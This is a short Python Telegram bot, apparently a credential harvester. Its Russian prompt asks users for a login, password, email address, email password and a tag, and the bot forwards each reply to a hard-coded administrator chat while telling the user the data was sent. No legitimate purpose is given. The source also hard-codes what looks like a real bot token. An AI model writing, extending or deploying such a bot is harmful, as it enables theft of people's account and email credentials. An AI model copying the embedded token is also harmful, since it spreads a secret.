import telebot
from telebot import types
import logging

TOKEN = "7837835834:AAHm3-hrbWlZ5tpKB2W6T16-keyolIQ-q84"
ADMIN_ID = 6760627781

bot = telebot.TeleBot(TOKEN)
logging.basicConfig(level=logging.INFO)

@bot.message_handler(commands=['start'])
def start(message):
    try:
        msg = bot.send_message(
            message.chat.id,
            "📝 Введите данные:\nЛогин:\nПароль:\nПочта:\nПароль от почты:\nТег:"
        )
        bot.register_next_step_handler(msg, process_data)
    except Exception as e:
        logging.error(e)

def process_data(message):
    try:
        data = message.text.split("\n")
        report = f"🔑 Новые данные от @{message.from_user.username}:\n" + "\n".join(data)
        bot.send_message(ADMIN_ID, report)
        bot.send_message(message.chat.id, "✅ Данные отправлены!")
    except Exception as e:
        logging.error(e)

if __name__ == "__main__":
    bot.polling(none_stop=True)
